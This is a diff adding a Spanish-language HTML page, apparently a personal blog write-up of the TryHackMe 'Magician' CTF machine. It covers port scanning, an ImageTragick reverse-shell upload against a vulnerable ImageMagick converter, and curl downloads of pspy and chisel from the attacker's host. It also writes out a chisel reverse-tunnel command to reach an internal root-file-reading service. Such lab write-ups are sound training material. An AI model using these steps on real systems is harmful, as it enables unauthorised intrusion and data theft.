@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="es">
+   <head>
+      <meta charset="UTF-8">
+      <link rel="stylesheet" href=../css/general.css>
+      <title>Magician</title>
+   </head>
+   <body>
+   	<h2>Magician</h2>
+   	<div>
+			<div>
+				<img src="../imagenes/magician/magician.png" alt="Magician">
+			</div>
+
+			<section>
+				<nav>
+					<p>
+						Esta màquina es de dificultad fàcil, se ubica en TryHackme y cuenta con una web que tiene la capacidad de convertir imagenes a <b>*.JPG</b>, sin embargo para este proceso se utiliza <b>ImageMagick</b> en una version vulnerable que admite la carga de contenido por debajo de una imagen creada, logrando asi la RCE, ademàs al tener acceso en primera instancia se logra verificar los procesos y este servidor internamente cuenta con una web que permite hacer ejecuciòn de comandos, logrando asi verificar contenido del superusuario desde esta web interna 
+					</p>
+					<p>
+						 Para comenzar, es necesario encender la maquina en la plataforma TryHakme y tener el archivo *.openvpn en nuestro dispositivo
+					</p>
+					<p>
+						Primeramente comenzamos haciendo un pineo a la màquina para verificar la correcta conecciòn de nuestra màquina a TryHackme y tambien mediante el <b>ttl</b> saber el Sistema Operativo al que no enfrentamos
+					</p>
+				</nav>
+				<img src="../imagenes/magician/pineo.png" alt="Pineo">
+				<div>
+					<nav>
+						<p>
+							Procedemos a realizar lo que nos indica la misma sala de la màquina, que indica <i>Agregar <b>magician</b> en /etc/hosts</i> tal como se aprecia a continuaciòn 
+						</p>
+					</nav>
+					<img src="../imagenes/magician/hosts.png" alt="Pineo">
+					 <nav>
+                  <p>
+                  	Ya habiendo realizado la verificaciòn de conectividad y haber puesto el contenido pertinente en nuestro <i>/hosts</i> procedemos a realizar un escaneo de los 65535 puertos con <b>nmap</b>, para verificar los puertos que se encuentran abiertos y cuales pueden ser los servicios y las posibles versiones que corren en cada uno de estos   
+                  </p>
+               </nav>
+					<img src="../imagenes/magician/nmap.png" alt="Escaneo nmap">
+					<nav>
+						<p>
+							Al revisar el escaneo de puertos se tiene el servicio <b>ftp</b> y <b>http</b> activos en la màquina por lo cual es importante verificar lo que corre especialmente en el puerto <b>8081</b> ya que si se trata de una web esta puede contener informaciòn relevante, llegando asi a obtener la siguiente web
+						</p>
+					</nav>
+               <img src="../imagenes/magician/magicianweb.png" alt="Web magician">
+					<nav>
+						<p style="text-align:center;">
+							La web que se puede apreciar permite la carga de imagenes, y hace la conversiòn de estas mediante <b>ImageMagick</b> 
+						</p>
+						<p>
+							Despues de haber revisado que se puede subir, las caracteristicas de esto y si se puede cargar codigo por debajo de las imagenes he llegado al repositorio de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20ImageMagick" target="_blank" style="text-decoration:none;"><b>Swissky</b></a> el cual contiene una serie de payloads y màs, sin embargo en este apartado tiene codigo para cargar a una version vulnerable de la aplicaciòn de procesamiento de imagenes <b>ImageMagick</b>, cabe destacar que haye muchos codigos en este repositorio para hacer varios proceso, sin embargo el que yo he utilizado ha sido <i>imagetragik1_payload_imageover_reverse_shell_netcat_fifo.png</i>, el cual yo he modificado poniendo mi <b>IP</b> local y mi puerto en el que pretendo ponerme en escucha 
+						</p>
+					</nav>
+					<img src="../imagenes/magician/reverseShell.png" alt="Shell reversa">
+					<nav>
+						<p>
+							Posterior a la carga el contenido mostrado anteriormenrte en la web de <b>magician</b>, me he puesto en escucha en el puerto especificado en la shell reversa e mi màquina logrando asi al darle a "procesar imagen" una consola interactiva con la màquina destino
+						</p>
+					</nav>
+					<img src="../imagenes/magician/primeraConeccion.png" alt="Conecciòn base"> <br>
+					<img src="../imagenes/magician/reconocimiento.png" alt="Verificaciòn de conectividad">
+					<nav>
+						<p style="text-align:center;">
+							Al ya lograr este acceso se puede encontrar la primera flag en el campo <i>/home/magician</i> 
+						</p>
+					</nav>
+					<img src="../imagenes/magician/flag1.png" alt="Primera flag">
+					<nav>
+						<p>
+							Para que sea màs sencillo el proceso de recopilar informaciòn de procesos que corren en la màquina sin <b>root</b> he utilizado <b>pspy</b>. Binario que he transferido desde mi màquina habilitando un servidor con python u descargando en la màquina destino con <b>curl</b>
+						</p>
+					</nav>
+              	<img src="../imagenes/magician/downloadpspy.png" alt="Descarga de pspy"> <br>
+               <div class="codigo-container">
+               	<div class="btn_cp">
+               		<a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+						</div>
+							 <pre class="codigo">
+
+curl -O &ltIP&gt:port/pspy
+							 </pre>
+					</div>
+					<nav>
+						<p>
+							Ya teniendo <b>pspy</b> en la maquina remota, he procedido a dar todos los permisos <i>777</i> y a ejecutar, pero poniendo la salida en un archivo que posteriormente pueda revisar detalladamente y me pueda servir como evidencia de la salida, ademàs he hecho que el proceso se haga en segundo plano, mientras bùscaba otro contenido en la màquina
+						</p>
+					</nav>
+					<img src="../imagenes/magician/pspy.png" alt="Ejecuciòn de pspy">
+					<nav>
+						<p>
+							Revisando el contenido del reporte he logrado encontrar que se está ejecutando una aplicación web escrita en Python utilizando Gunicorn como servidor WSGI, aplicaciòn vinculada a la ip <i>127.0.0.1</i> en el puerto <i>6666</i> lo que significa que solo es accesible desde el mismo servidor y no desde redes externas, motivo por el cual no la hemos encntrado en el escaneo con <b>nmap</b> 
+						</p>
+					</nav>
+					<img src="../imagenes/magician/ports.png" alt="Hallazgo">
+					<nav>
+						<p>
+							Procediendo a revisar que es lo que invoca al llamar a esta <b>IP</b> que parece ser la local procedemos al <i>/etc/hosts</i> donde se tiene lo sieguiente
+						</p>
+					</nav>
+					<img src="../imagenes/magician/hostsr.png" alt="Hosts remoto">
+					<nav>
+						<p>
+							Ya teniendo un puerto que posiblemente expone un servicio he procedido a cargar <b>chisel</b> a la màquina remota, como anteriormente hice con <b>pspy</b>, y asimismo haciendo la descarga de esta herramienta con <b>curl</b>
+						</p>
+					</nav>
+					<img src="../imagenes/magician/chisel.png" alt="Descarga de chisel">
+					<nav>
+						<p>
+							Ya habiendo descargado <b>chisel</b> en la màquina remota he procedido e ejecutar esta herramienta como cliente para redirigir el contenido del puerto <i>6666</i> a mi màquina que he puesto como servidor 
+						</p>
+					</nav>
+					<img src="../imagenes/magician/tunel.png" alt="Tunelizaciòn chisel"> <br>
+					<nav>
+						<p style="text-align:center;">
+							Por parte de la màquina remota
+						</p>
+					</nav>
+               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+
+./chisel client 10.9.208.200:9002 R:9001:127.0.0.1:6666
+                      </pre>
+               </div>
+					<nav>
+                  <p style="text-align:center;">    
+                     Por parte de mi màquina local
+                  </p>
+               </nav>
+               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+
+chisel server --reverse -p 9002
+                      </pre>
+               </div>
+
+               <nav>
+						<p>
+							Logrando asi en mi màquina encontrar una web en la que puedo poner la ruta absoluta de algunos archivos y esta me devuelve el contenido, es importante destacar que <i>En esta màquina me ha pasado que al poner por ejemplo /etc/passswd habia veces en las que me devolvia en binario, en base64 y otros formatos</i>
+						</p>
+               </nav>
+					<img src="../imagenes/magician/internaWeb.png" alt="Web interna"> <br>
+					<nav>
+						<p>
+							Ya en este punto he apuntado directamente a una ruta donde posiblemente estea la flag y por supuesto como el usuario <b>root</b> donde he logrado encontrar la segunda bandera, como he mencionado anteriormente poniendo la ruta me devuelve los datos pero al parecer cifrado en diferentes modos, por lo que este de la captura es el que se me ha hecho màs familiar para desencryptar
+						</p>
+					</nav>
+					<img src="../imagenes/magician/flag2.png" alt="Segunda flag">
+					<nav>
+						<p>
+							Para procesar la flag que esta encryptada, simplemente desde mi consola he procedido a ejecutar <b>base64 -d</b> con lo cual puedo desencryptar de manera sencilla y ràpida contenido en <b>base64</b>
+						</p>
+					</nav>
+					<img src="../imagenes/magician/decrypt.png" alt="Desencryptar base64">
+					<nav>
+						<p>
+							LLegando asi al final de esta màquina, ya teniendo las 2 flas y aplicando forwarding para emular en nuestro dispositivo el contenido que deberia solo ser visible para la màquina remota, haciendo el redireccionamiento de tràfico
+						</p>
+					</nav> 
+				</div>
+				
+			</section>
+					
+   	</div>
+   </body>
+   <hr>
+   <footer>
+      <div>
+         Jcarlos
+      </div>
+      <div>
+         <a href="https://rb.gy/d2u7jy" target="_blank" > Linkeding </a>
+      </div>
+   </footer>
+	<script src="../js/global.js"></script>
+</html>
